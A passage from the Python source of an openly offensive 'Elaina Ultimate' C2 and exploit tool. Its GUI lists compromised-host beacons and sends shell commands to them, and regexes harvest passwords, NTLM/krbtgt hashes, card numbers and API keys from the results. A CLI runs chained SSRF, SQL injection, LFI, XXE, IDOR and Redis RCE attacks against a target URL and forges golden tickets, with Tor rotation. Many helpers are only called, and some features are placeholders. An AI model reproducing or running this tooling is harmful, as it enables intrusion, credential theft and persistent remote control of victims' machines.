        script_editor_layout = QVBoxLayout(script_editor_group)
        
        self.script_editor = QTextEdit()
        self.script_editor.setFont(QFont("Consolas", 10))
        script_editor_layout.addWidget(self.script_editor)
        
        layout.addWidget(script_editor_group)
        
        # Create script buttons
        script_buttons_layout = QHBoxLayout()
        
        self.new_script_button = QPushButton("New")
        self.new_script_button.clicked.connect(self.new_script)
        script_buttons_layout.addWidget(self.new_script_button)
        
        self.save_script_button = QPushButton("Save")
        self.save_script_button.clicked.connect(self.save_script)
        script_buttons_layout.addWidget(self.save_script_button)
        
        self.load_script_button = QPushButton("Load")
        self.load_script_button.clicked.connect(self.load_script)
        script_buttons_layout.addWidget(self.load_script_button)
        
        self.execute_script_button = QPushButton("Execute")
        self.execute_script_button.clicked.connect(self.execute_script)
        script_buttons_layout.addWidget(self.execute_script_button)
        
        script_buttons_layout.addStretch()
        
        layout.addLayout(script_buttons_layout)
        
        self.tab_widget.addTab(scripts_widget, "Scripts")
        
    def create_view_tab(self):
        view_widget = QWidget()
        layout = QVBoxLayout(view_widget)
        
        # Create web view
        self.web_view = QWebEngineView()
        layout.addWidget(self.web_view)
        
        # Create navigation bar
        nav_layout = QHBoxLayout()
        
        self.back_button = QPushButton("Back")
        self.back_button.clicked.connect(self.web_view.back)
        nav_layout.addWidget(self.back_button)
        
        self.forward_button = QPushButton("Forward")
        self.forward_button.clicked.connect(self.web_view.forward)
        nav_layout.addWidget(self.forward_button)
        
        self.refresh_button = QPushButton("Refresh")
        self.refresh_button.clicked.connect(self.web_view.reload)
        nav_layout.addWidget(self.refresh_button)
        
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("Enter URL...")
        nav_layout.addWidget(self.url_input)
        
        self.go_button = QPushButton("Go")
        self.go_button.clicked.connect(self.navigate_to_url)
        nav_layout.addWidget(self.go_button)
        
        layout.addLayout(nav_layout)
        
        self.tab_widget.addTab(view_widget, "View")
        
    def setup_system_tray(self):
        self.tray_icon = QSystemTrayIcon(self)
        self.tray_icon.setIcon(self.style().standardIcon(QStyle.SP_ComputerIcon))
        
        tray_menu = QMenu()
        
        show_action = QAction("Show", self)
        show_action.triggered.connect(self.show)
        tray_menu.addAction(show_action)
        
        hide_action = QAction("Hide", self)
        hide_action.triggered.connect(self.hide)
        tray_menu.addAction(hide_action)
        
        tray_menu.addSeparator()
        
        exit_action = QAction("Exit", self)
        exit_action.triggered.connect(self.close)
        tray_menu.addAction(exit_action)
        
        self.tray_icon.setContextMenu(tray_menu)
        self.tray_icon.show()
        
    def setup_timers(self):
        # Timer for updating dashboard
        self.dashboard_timer = QTimer(self)
        self.dashboard_timer.timeout.connect(self.update_dashboard)
        self.dashboard_timer.start(5000)  # Update every 5 seconds
        
        # Timer for updating beacons
        self.beacons_timer = QTimer(self)
        self.beacons_timer.timeout.connect(self.update_beacons)
        self.beacons_timer.start(2000)  # Update every 2 seconds
        
        # Timer for updating attacks
        self.attacks_timer = QTimer(self)
        self.attacks_timer.timeout.connect(self.update_attacks)
        self.attacks_timer.start(3000)  # Update every 3 seconds
        
    def update_dashboard(self):
        # Update beacons count
        self.beacons_count_label.setText(str(len(self.beacons)))
        
        # Update targets count (placeholder)
        self.targets_count_label.setText(str(len(self.beacons)))
        
        # Update attacks count (placeholder)
        self.attacks_count_label.setText("0")
        
        # Update recent activity
        if len(self.log_entries) > 0:
            self.recent_activity_list.clear()
            for entry in self.log_entries[-10:]:  # Show last 10 entries
                item_text = f"[{entry['time']}] {entry['action']} {entry['target']} {entry['status']}"
                if entry.get('detail'):
                    item_text += f" - {entry['detail']}"
                self.recent_activity_list.addItem(item_text)
        
    def update_beacons(self):
        # Update beacons table
        self.beacons_table.setRowCount(len(self.beacons))
        
        row = 0
        for beacon_id, beacon_info in self.beacons.items():
            self.beacons_table.setItem(row, 0, QTableWidgetItem(beacon_id))
            self.beacons_table.setItem(row, 1, QTableWidgetItem(beacon_info.get("address", ["N/A"])[0]))
            self.beacons_table.setItem(row, 2, QTableWidgetItem(beacon_info.get("user", "N/A")))
            self.beacons_table.setItem(row, 3, QTableWidgetItem(beacon_info.get("hostname", "N/A")))
            self.beacons_table.setItem(row, 4, QTableWidgetItem(beacon_info.get("os", "N/A")))
            self.beacons_table.setItem(row, 5, QTableWidgetItem(beacon_info.get("process", "N/A")))
            
            last_checkin = beacon_info.get("last_checkin", 0)
            if last_checkin > 0:
                last_checkin_str = datetime.fromtimestamp(last_checkin).strftime("%Y-%m-%d %H:%M:%S")
            else:
                last_checkin_str = "N/A"
            
            self.beacons_table.setItem(row, 6, QTableWidgetItem(last_checkin_str))
            
            row += 1
        
        # Resize columns to content
        self.beacons_table.resizeColumnsToContents()
        
    def update_attacks(self):
        # Placeholder for updating attacks table
        pass
        
    def interact_with_beacon(self):
        selected_items = self.beacons_table.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "No Selection", "Please select a beacon to interact with.")
            return
        
        row = selected_items[0].row()
        beacon_id = self.beacons_table.item(row, 0).text()
        
        dialog = EnhancedBeaconInteractDialog(self, beacon_id, self.beacons.get(beacon_id, {}))
        dialog.command_sent.connect(self.send_beacon_command)
        dialog.exec_()
        
    def send_beacon_command(self, beacon_id, command):
        if self.c2_server and beacon_id in self.c2_server.clients:
            # Add task to C2 server
            task_id = self.c2_server.add_task(beacon_id, "shell", command)
            
            # Add to log
            self.log_entries.append({
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "action": "command",
                "target": beacon_id,
                "status": "sent",
                "detail": command
            })
            
            # Update beacon output
            timestamp = datetime.now().strftime('%H:%M:%S')
            self.beacon_output.append(f"[{timestamp}] > {command}")
            
            # Update status bar
            self.status_bar.showMessage(f"Command sent to beacon {beacon_id}")
        else:
            QMessageBox.warning(self, "Error", f"Beacon {beacon_id} not connected or C2 server not running.")
            
    def add_beacon_result(self, beacon_id, result):
        # Update beacon output
        timestamp = datetime.now().strftime('%H:%M:%S')
        
        if "stdout" in result and result["stdout"]:
            self.beacon_output.append(f"[{timestamp}] {result['stdout']}")
        
        if "stderr" in result and result["stderr"]:
            self.beacon_output.append(f"[{timestamp}] {result['stderr']}")
        
        # Add to log
        self.log_entries.append({
            "time": timestamp,
            "action": "result",
            "target": beacon_id,
            "status": "received",
            "detail": f"stdout: {result.get('stdout', '')}, stderr: {result.get('stderr', '')}"
        })
        
    def remove_beacon(self):
        selected_items = self.beacons_table.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "No Selection", "Please select a beacon to remove.")
            return
        
        row = selected_items[0].row()
        beacon_id = self.beacons_table.item(row, 0).text()
        
        reply = QMessageBox.question(self, "Confirm Removal", 
                                    f"Are you sure you want to remove beacon {beacon_id}?",
                                    QMessageBox.Yes | QMessageBox.No)
        
        if reply == QMessageBox.Yes:
            if beacon_id in self.beacons:
                del self.beacons[beacon_id]
                
                # Add to log
                self.log_entries.append({
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "action": "remove",
                    "target": beacon_id,
                    "status": "success"
                })
                
                # Update status bar
                self.status_bar.showMessage(f"Beacon {beacon_id} removed")
                
    def new_attack(self):
        # Placeholder for new attack dialog
        QMessageBox.information(self, "New Attack", "New attack functionality not implemented yet.")
        
    def stop_attack(self):
        # Placeholder for stop attack functionality
        QMessageBox.information(self, "Stop Attack", "Stop attack functionality not implemented yet.")
        
    def start_c2_server(self):
        host = self.c2_host_input.text()
        port = self.c2_port_input.value()
        ssl_enabled = self.c2_ssl_checkbox.isChecked()
        cert_file = self.c2_cert_input.text() if ssl_enabled else None
        key_file = self.c2_key_input.text() if ssl_enabled else None
        
        self.c2_server = C2Server(host, port, ssl_enabled, cert_file, key_file)
        
        if self.c2_server.start():
            self.c2_status_label.setText("Running")
            self.c2_status_label.setStyleSheet("font-size: 18px; font-weight: bold; color: green;")
            
            self.start_c2_button.setEnabled(False)
            self.stop_c2_button.setEnabled(True)
            
            # Add to log
            self.log_entries.append({
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "action": "start_c2",
                "target": f"{host}:{port}",
                "status": "success"
            })
            
            # Update status bar
            self.status_bar.showMessage(f"C2 server started on {host}:{port}")
            
            # Add to C2 output
            self.c2_output.append(f"[{datetime.now().strftime('%H:%M:%S')}] C2 server started on {host}:{port}")
        else:
            self.c2_status_label.setText("Failed to Start")
            self.c2_status_label.setStyleSheet("font-size: 18px; font-weight: bold; color: red;")
            
            # Add to log
            self.log_entries.append({
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "action": "start_c2",
                "target": f"{host}:{port}",
                "status": "failed"
            })
            
            # Update status bar
            self.status_bar.showMessage("Failed to start C2 server")
            
            # Add to C2 output
            self.c2_output.append(f"[{datetime.now().strftime('%H:%M:%S')}] Failed to start C2 server on {host}:{port}")
            
    def stop_c2_server(self):
        if self.c2_server:
            self.c2_server.stop()
            self.c2_server = None
            
            self.c2_status_label.setText("Stopped")
            self.c2_status_label.setStyleSheet("font-size: 18px; font-weight: bold; color: red;")
            
            self.start_c2_button.setEnabled(True)
            self.stop_c2_button.setEnabled(False)
            
            # Add to log
            self.log_entries.append({
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "action": "stop_c2",
                "target": "C2 Server",
                "status": "success"
            })
            
            # Update status bar
            self.status_bar.showMessage("C2 server stopped")
            
            # Add to C2 output
            self.c2_output.append(f"[{datetime.now().strftime('%H:%M:%S')}] C2 server stopped")
            
    def generate_beacon(self):
        # Placeholder for beacon generation dialog
        QMessageBox.information(self, "Generate Beacon", "Beacon generation functionality not implemented yet.")
        
    def add_listener(self):
        # Placeholder for add listener functionality
        QMessageBox.information(self, "Add Listener", "Add listener functionality not implemented yet.")
        
    def remove_listener(self):
        # Placeholder for remove listener functionality
        QMessageBox.information(self, "Remove Listener", "Remove listener functionality not implemented yet.")
        
    def new_script(self):
        self.script_editor.clear()
        
    def save_script(self):
        file_path, _ = QFileDialog.getSaveFileName(self, "Save Script", "", "Python Files (*.py);;All Files (*)")
        if file_path:
            try:
                with open(file_path, 'w') as f:
                    f.write(self.script_editor.toPlainText())
                
                # Add to log
                self.log_entries.append({
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "action": "save_script",
                    "target": file_path,
                    "status": "success"
                })
                
                # Update status bar
                self.status_bar.showMessage(f"Script saved to {file_path}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to save script: {str(e)}")
                
    def load_script(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Load Script", "", "Python Files (*.py);;All Files (*)")
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    self.script_editor.setPlainText(f.read())
                
                # Add to log
                self.log_entries.append({
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "action": "load_script",
                    "target": file_path,
                    "status": "success"
                })
                
                # Update status bar
                self.status_bar.showMessage(f"Script loaded from {file_path}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to load script: {str(e)}")
                
    def execute_script(self):
        # Placeholder for script execution functionality
        QMessageBox.information(self, "Execute Script", "Script execution functionality not implemented yet.")
        
    def navigate_to_url(self):
        url = self.url_input.text()
        if url:
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            
            self.web_view.setUrl(QUrl(url))
            
            # Add to log
            self.log_entries.append({
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "action": "navigate",
                "target": url,
                "status": "success"
            })
            
            # Update status bar
            self.status_bar.showMessage(f"Navigated to {url}")

class EnhancedElainaMainWindow(ElainaMainWindow):
    def __init__(self):
        super().__init__()
        self.output_displays = {}
        self.init_enhanced_ui()
        
    def init_enhanced_ui(self):
        # Replace the beacon output area with enhanced output display
        for i in range(self.tab_widget.count()):
            if self.tab_widget.tabText(i) == "Beacons":
                beacons_widget = self.tab_widget.widget(i)
                
                for child in beacons_widget.children():
                    if isinstance(child, QGroupBox) and child.title() == "Beacon Output":
                        layout = child.layout()
                        if layout:
                            if layout.itemAt(0) and isinstance(layout.itemAt(0).widget(), QTextEdit):
                                layout.itemAt(0).widget().deleteLater()
                            
                            self.enhanced_output = OutputDisplayWidget()
                            layout.addWidget(self.enhanced_output)
                        break
                break
                
    def interact_with_beacon(self):
        selected_items = self.beacons_table.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "No Selection", "Please select a beacon to interact with.")
            return
        
        row = selected_items[0].row()
        beacon_id = self.beacons_table.item(row, 0).text()
        
        dialog = EnhancedBeaconInteractDialog(self, beacon_id, self.beacons.get(beacon_id, {}))
        dialog.command_sent.connect(self.send_beacon_command)
        dialog.exec_()
        
    def add_beacon_result(self, beacon_id, result):
        if hasattr(self, 'enhanced_output'):
            timestamp = datetime.now().strftime('%H:%M:%S')
            
            if "stdout" in result and result["stdout"]:
                self.enhanced_output.add_console_output(f"[{timestamp}] {result['stdout']}")
            
            if "stderr" in result and result["stderr"]:
                self.enhanced_output.add_console_output(f"[{timestamp}] {result['stderr']}", "#FF0000")
            
            self.extract_credentials(result.get("stdout", "") + result.get("stderr", ""), beacon_id)
            self.extract_sysinfo(result.get("stdout", "") + result.get("stderr", ""), beacon_id)
            self.extract_network_info(result.get("stdout", "") + result.get("stderr", ""), beacon_id)
            
            super().add_beacon_result(beacon_id, result)
            
    def extract_credentials(self, text, source):
        patterns = [
            r'password[\'"\s]*[:=][\'"\s]*([^\s\'"]+)',
            r'pwd[\'"\s]*[:=][\'"\s]*([^\s\'"]+)',
            r'pass[\'"\s]*[:=][\'"\s]*([^\s\'"]+)',
            r'([a-fA-F0-9]{32})',
            r'([a-fA-F0-9]{40})',
            r'([a-fA-F0-9]{64})',
            r'([a-fA-F0-9]{128})',
            r'([a-fA-F0-9]{32}:[a-fA-F0-9]{32})',
            r'krbtgt:[a-fA-F0-9]{32}',
            r'(\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4})',
            r'(AIza[0-9A-Za-z\-_]{35})',
            r'(sk-[a-zA-Z0-9-_]{48})',
            r'(pk-[a-zA-Z0-9-_]{48})',
        ]
        
        user_pass_patterns = [
            r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)[\s,]+([^\s,]+)',
            r'username[\'"\s]*[:=][\'"\s]*([^\s\'"]+)[\s,]+password[\'"\s]*[:=][\'"\s]*([^\s\'"]+)',
            r'user[\'"\s]*[:=][\'"\s]*([^\s\'"]+)[\s,]+pass[\'"\s]*[:=][\'"\s]*([^\s\'"]+)',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                if isinstance(match, tuple):
                    for m in match:
                        if m and len(m) > 3:
                            self.enhanced_output.add_credential("Unknown", m, "Hash/Token", source)
                else:
                    if match and len(match) > 3:
                        self.enhanced_output.add_credential("Unknown", match, "Hash/Token", source)
        
        for pattern in user_pass_patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                if isinstance(match, tuple) and len(match) >= 2:
                    username = match[0]
                    password = match[1]
                    if username and password and len(username) > 2 and len(password) > 2:
                        self.enhanced_output.add_credential(username, password, "Plaintext", source)
                        
    def extract_sysinfo(self, text, source):
        sysinfo = {}
        
        os_patterns = [
            r'(Windows\s+\S+)',
            r'(Linux\s+\S+)',
            r'(macOS\s+\S+)',
            r'(Darwin\s+\S+)',
            r'(Ubuntu\s+\S+)',
            r'(CentOS\s+\S+)',
            r'(Debian\s+\S+)',
            r'(Red Hat\s+\S+)',
            r'(Fedora\s+\S+)',
            r'(SUSE\s+\S+)',
            r'(Arch\s+\S+)',
            r'(Mint\s+\S+)'
        ]
        
        for pattern in os_patterns:
            match = re.search(pattern, text)
            if match:
                sysinfo["OS"] = match.group(1)
                break
                
        hostname_patterns = [
            r'Hostname:\s*(\S+)',
            r'ComputerName:\s*(\S+)',
            r'Host Name:\s*(\S+)',
            r'Name:\s*(\S+)'
        ]
        
        for pattern in hostname_patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                sysinfo["Hostname"] = match.group(1)
                break
                
        username_patterns = [
            r'User Name:\s*(\S+)',
            r'Username:\s*(\S+)',
            r'User:\s*(\S+)',
            r'Current User:\s*(\S+)',
            r'Logged in as:\s*(\S+)'
        ]
        
        for pattern in username_patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                sysinfo["User"] = match.group(1)
                break
                
        ip_patterns = [
            r'IPv4 Address[.\s]+:\s*(\d+\.\d+\.\d+\.\d+)',
            r'IP Address[.\s]+:\s*(\d+\.\d+\.\d+\.\d+)',
            r'IP[.\s]+:\s*(\d+\.\d+\.\d+\.\d+)',
            r'(\d+\.\d+\.\d+\.\d+)'
        ]
        
        ips = []
        for pattern in ip_patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                if match and match not in ips:
                    ips.append(match)
        
        if ips:
            sysinfo["IP Addresses"] = ips
            
        mac_patterns = [
            r'MAC Address[.\s]+:\s*([0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2})',
            r'Physical Address[.\s]+:\s*([0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2})',
            r'([0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2})'
        ]
        
        macs = []
        for pattern in mac_patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                if match and match not in macs:
                    macs.append(match)
        
        if macs:
            sysinfo["MAC Addresses"] = macs
            
        if sysinfo:
            self.enhanced_output.add_sysinfo(sysinfo)
            
    def extract_network_info(self, text, source):
        connection_patterns = [
            r'TCP\s+(\d+\.\d+\.\d+\.\d+):(\d+)\s+(\d+\.\d+\.\d+\.\d+):(\d+)\s+(\w+)',
            r'UDP\s+(\d+\.\d+\.\d+\.\d+):(\d+)\s+(\*\.\*\.\*\.\*|\d+\.\d+\.\d+\.\d+):(\d+)\s+(\w+)'
        ]
        
        connections = []
        for pattern in connection_patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                if len(match) >= 5:
                    conn = {
                        "protocol": "TCP" if pattern.startswith("TCP") else "UDP",
                        "local_address": match[0],
                        "local_port": match[1],
                        "remote_address": match[2],
                        "remote_port": match[3],
                        "state": match[4] if len(match) > 4 else "N/A"
                    }
                    connections.append(conn)
        
        listening_patterns = [
            r'TCP\s+(\d+\.\d+\.\d+\.\d+):(\d+)\s+0\.0\.0\.0:0\s+(LISTENING)',
            r'UDP\s+(\d+\.\d+\.\d+\.\d+):(\d+)\s+\*\.\*\.\*\.\*:\*\s+(.*)'
        ]
        
        listening_ports = []
        for pattern in listening_patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                if len(match) >= 2:
                    port = {
                        "protocol": "TCP" if pattern.startswith("TCP") else "UDP",
                        "address": match[0],
                        "port": match[1],
                        "state": "LISTENING"
                    }
                    listening_ports.append(port)
        
        if connections or listening_ports:
            network_info = "=== NETWORK INFORMATION ===\n\n"
            
            if connections:
                network_info += "=== CONNECTIONS ===\n"
                network_info += f"{'Protocol':<8} {'Local Address':<20} {'Local Port':<12} {'Remote Address':<20} {'Remote Port':<12} {'State':<12}\n"
                network_info += "-" * 84 + "\n"
                
                for conn in connections:
                    network_info += f"{conn['protocol']:<8} {conn['local_address']:<20} {conn['local_port']:<12} {conn['remote_address']:<20} {conn['remote_port']:<12} {conn['state']:<12}\n"
                
                network_info += "\n"
            
            if listening_ports:
                network_info += "=== LISTENING PORTS ===\n"
                network_info += f"{'Protocol':<8} {'Address':<20} {'Port':<12} {'State':<12}\n"
                network_info += "-" * 52 + "\n"
                
                for port in listening_ports:
                    network_info += f"{port['protocol']:<8} {port['address']:<20} {port['port']:<12} {port['state']:<12}\n"
            
            self.enhanced_output.add_network_output(network_info, "#0000FF")
            
    def save_all_output(self):
        file_path, _ = QFileDialog.getSaveFileName(self, "Save All Output", "", "Text Files (*.txt)")
        if file_path:
            try:
                with open(file_path, 'w') as f:
                    f.write("=== ELAINA ULTIMATE OUTPUT ===\n")
                    f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                    
                    f.write("=== BEACONS ===\n\n")
                    for beacon_id, beacon_info in self.beacons.items():
                        f.write(f"Beacon ID: {beacon_id}\n")
                        f.write(f"Internal IP: {beacon_info.get('address', ['N/A'])[0]}\n")
                        f.write(f"User: {beacon_info.get('user', 'N/A')}\n")
                        f.write(f"Hostname: {beacon_info.get('hostname', 'N/A')}\n")
                        f.write(f"OS: {beacon_info.get('os', 'N/A')}\n")
                        f.write(f"Last Checkin: {datetime.fromtimestamp(beacon_info.get('last_checkin', 0)).strftime('%Y-%m-%d %H:%M:%S') if beacon_info.get('last_checkin', 0) > 0 else 'N/A'}\n")
                        f.write("-" * 50 + "\n")
                    
                    f.write("\n")
                    
                    f.write("=== ACTIVITY LOG ===\n\n")
                    for entry in self.log_entries:
                        f.write(f"[{entry['time']}] {entry['action']} {entry['target']} {entry['status']}\n")
                        if entry.get('detail'):
                            f.write(f"  Detail: {entry['detail']}\n")
                    
                    f.write("\n")
                    
                    if hasattr(self, 'enhanced_output'):
                        self.enhanced_output.save_output(file_path)
                
                QMessageBox.information(self, "Success", f"All output saved to {file_path}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to save output: {str(e)}")

def execute(target=None, ldap_subnet=None, use_tor=False, tor_pass="yuriontop", use_burp=False, winrm_user=None, winrm_pass=None, pfx_path=None, pfx_password=None, 
            golden_ticket=False, gt_domain=None, gt_user=None, gt_krbtgt_hash=None, gt_sid=None, gt_dc_ip=None, gt_lifetime=10, gt_target=None, gt_command=None,
            c2_server=False, c2_host=None, c2_port=None, c2_ssl=False, c2_cert=None, c2_key=None,
            c2_beacon=False, c2_beacon_host=None, c2_beacon_port=None, c2_beacon_ssl=False,
            silver_c2=False, silver_c2_host=None, silver_c2_port=None, silver_c2_domain=None,
            gui=False):
    open(LOG_JSON_PATH, "w").write("[]")
    open(COOKIE_PATH, "w").write("")
    
    if gui:
        global main_window
        app = QApplication(sys.argv)
        app.setApplicationName("Elaina Ultimate C2 Framework")
        app.setApplicationVersion("1.0")
        
        main_window = EnhancedElainaMainWindow()
        main_window.show()
        
        file_menu = main_window.menuBar().findChild(QMenu, "File")
        if file_menu:
            save_all_output_action = QAction("Save All Output", main_window)
            save_all_output_action.triggered.connect(main_window.save_all_output)
            file_menu.addAction(save_all_output_action)
        
        sys.exit(app.exec_())
    
    logger.info("Running in CLI mode")
    
    if c2_server and c2_host and c2_port:
        c2 = C2Server(c2_host, c2_port, c2_ssl, c2_cert, c2_key)
        if c2.start():
            logger.info(f"C2 server started on {c2_host}:{c2_port}")
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                c2.stop()
                logger.info("C2 server stopped")
                sys.exit(0)
        else:
            logger.error("Failed to start C2 server")
            sys.exit(1)
    
    if c2_beacon and c2_beacon_host and c2_beacon_port:
        beacon = OptimizedBeacon(c2_beacon_host, c2_beacon_port, "http", c2_beacon_ssl)
        if beacon.start():
            logger.info("C2 beacon started successfully")
            sys.exit(0)
        else:
            logger.error("Failed to start C2 beacon")
            sys.exit(1)
    
    if silver_c2 and silver_c2_host and silver_c2_port:
        silver_beacon = StealthBeacon(silver_c2_host, silver_c2_port, "http", False)
        if silver_beacon.start():
            logger.info("Silver C2 beacon started successfully")
            sys.exit(0)
        else:
            logger.error("Failed to start Silver C2 beacon")
            sys.exit(1)
    
    if golden_ticket and gt_domain and gt_user and gt_krbtgt_hash and gt_sid:
        gt = GoldenTicket(gt_domain, gt_user, gt_krbtgt_hash, gt_sid, gt_dc_ip, gt_lifetime)
        ccache_path = gt.create_ticket()
        gt.inject_ticket()
        
        if gt_target:
            gt.use_ticket(gt_target, gt_command)
    
    if not target:
        logger.error("No target URL specified for CLI mode")
        logger.info("Use --gui to start in GUI mode, or provide a target URL")
        sys.exit(1)
    
    if use_tor:
        renew_tor_ip(tor_pass)
    
    proxy_cfg = load_proxy_config()
    session = setup_scraper(proxy_cfg)
    
    ldap_ip = None
    if ldap_subnet:
        ldap_candidates = scan_ldap_ips(ldap_subnet)
        if ldap_candidates:
            ldap_ip = ldap_candidates[0]
        else:
            ldap_ip = "10.0.0.5"
    else:
        ldap_ip = "10.0.0.5"
    
    spider(target, session)
    if not chain_exploit_ssrf_to_adcs(session, target, ldap_ip, winrm_user, winrm_pass, pfx_path, pfx_password):
        attempt_sql_injection(target, session)
        attempt_ssrf(target, session, ldap_ip)
        attempt_lfi(target, session)
        attempt_xxe(target, session)
        attempt_idor(target, session)
        attempt_redis_rce(ldap_ip)
    
    driver = setup_browser(proxy_cfg)
    try:
        storage = dump_browser_storage(driver, target)
        js_endpoints = extract_js_endpoints(driver)
        ws_endpoints = dump_websocket_endpoints(driver)
        
        if use_burp:
            for req in driver.requests:
                send_to_burp(req)
        
        full_log = {
            "url": target,
            "storage": storage,
            "js_endpoints": js_endpoints,
            "websocket_endpoints": ws_endpoints,
            "chain_exploit": True
        }
        
        with open(LOG_JSON_PATH, "a") as f:
            f.write(json.dumps(full_log, indent=2))
    finally:
        driver.quit()

def main():
    parser = argparse.ArgumentParser(description="Elaina Ultimate Exploit Tool")
    parser.add_argument("url", help="Target URL to scan & attack", nargs='?', default=None)
    parser.add_argument("--tor", action="store_true", help="Enable TOR")
    parser.add_argument("--tor-pass", default="yuriontop", help="TOR control password")
    parser.add_argument("--burp", action="store_true", help="Send requests to Burp Repeater API")
    parser.add_argument("--ldap-subnet", help="CIDR subnet for LDAP scan, e.g. 10.0.0.0/24")
    parser.add_argument("--winrm-user", help="Username for WinRM PowerShell execution")
    parser.add_argument("--winrm-pass", help="Password for WinRM PowerShell execution")
    parser.add_argument("--pfx-path", help="Path to .pfx certificate for WinRM authentication")
    parser.add_argument("--pfx-password", help="Password for .pfx certificate")
    
    parser.add_argument("--golden-ticket", action="store_true", help="Generate a Golden Ticket")
    parser.add_argument("--gt-domain", help="Domain for Golden Ticket")
    parser.add_argument("--gt-user", help="Username for Golden Ticket")
    parser.add_argument("--gt-krbtgt-hash", help="Hash of krbtgt account for Golden Ticket")
    parser.add_argument("--gt-sid", help="Domain SID for Golden Ticket")
    parser.add_argument("--gt-dc-ip", help="Domain Controller IP (optional)")
    parser.add_argument("--gt-lifetime", type=int, default=10, help="Golden ticket lifetime in hours (default: 10)")
    parser.add_argument("--gt-target", help="Target to use the Golden Ticket against")
    parser.add_argument("--gt-command", help="Command to execute with the Golden Ticket")
    
    parser.add_argument("--c2-server", action="store_true", help="Start C2 server")
    parser.add_argument("--c2-host", default="0.0.0.0", help="C2 server host (default: 0.0.0.0)")
    parser.add_argument("--c2-port", type=int, default=8080, help="C2 server port (default: 8080)")
    parser.add_argument("--c2-ssl", action="store_true", help="Enable SSL for C2 server")
    parser.add_argument("--c2-cert", help="Path to SSL certificate file")
    parser.add_argument("--c2-key", help="Path to SSL private key file")
    
    parser.add_argument("--c2-beacon", action="store_true", help="Start C2 beacon")
    parser.add_argument("--c2-beacon-host", help="C2 server host for beacon")
    parser.add_argument("--c2-beacon-port", type=int, help="C2 server port for beacon")
    parser.add_argument("--c2-beacon-ssl", action="store_true", help="Enable SSL for C2 beacon")
    
    parser.add_argument("--silver-c2", action="store_true", help="Start Silver C2 beacon")
    parser.add_argument("--silver-c2-host", help="Silver C2 server host")
    parser.add_argument("--silver-c2-port", type=int, help="Silver C2 server port")
    parser.add_argument("--silver-c2-domain", help="Silver C2 domain for DNS tunneling")
    
    parser.add_argument("--gui", action="store_true", help="Start GUI interface")
    parser.add_argument("--no-gui", action="store_true", help="Force CLI mode")
    
    args = parser.parse_args()
    
    if args.gui:
        logger.info("Starting in GUI mode")
        execute(
            target=args.url,
            ldap_subnet=args.ldap_subnet,
            use_tor=args.tor,
            tor_pass=args.tor_pass,
            use_burp=args.burp,
            winrm_user=args.winrm_user,
            winrm_pass=args.winrm_pass,
            pfx_path=args.pfx_path,
            pfx_password=args.pfx_password,
            golden_ticket=args.golden_ticket,
            gt_domain=args.gt_domain,
            gt_user=args.gt_user,
            gt_krbtgt_hash=args.gt_krbtgt_hash,
            gt_sid=args.gt_sid,
            gt_dc_ip=args.gt_dc_ip,
            gt_lifetime=args.gt_lifetime,
            gt_target=args.gt_target,
            gt_command=args.gt_command,
            c2_server=args.c2_server,
            c2_host=args.c2_host,
            c2_port=args.c2_port,
            c2_ssl=args.c2_ssl,
            c2_cert=args.c2_cert,
            c2_key=args.c2_key,
            c2_beacon=args.c2_beacon,
            c2_beacon_host=args.c2_beacon_host,
            c2_beacon_port=args.c2_beacon_port,
            c2_beacon_ssl=args.c2_beacon_ssl,
            silver_c2=args.silver_c2,
            silver_c2_host=args.silver_c2_host,
            silver_c2_port=args.silver_c2_port,
            silver_c2_domain=args.silver_c2_domain,
            gui=True
        )
    elif not args.url and not args.no_gui:
        logger.info("No target URL specified, starting in GUI mode")
        execute(
            target=None,
            ldap_subnet=args.ldap_subnet,
            use_tor=args.tor,
            tor_pass=args.tor_pass,
            use_burp=args.burp,
            winrm_user=args.winrm_user,
            winrm_pass=args.winrm_pass,
            pfx_path=args.pfx_path,
            pfx_password=args.pfx_password,
            golden_ticket=args.golden_ticket,
            gt_domain=args.gt_domain,
            gt_user=args.gt_user,
            gt_krbtgt_hash=args.gt_krbtgt_hash,
            gt_sid=args.gt_sid,
            gt_dc_ip=args.gt_dc_ip,
            gt_lifetime=args.gt_lifetime,
            gt_target=args.gt_target,
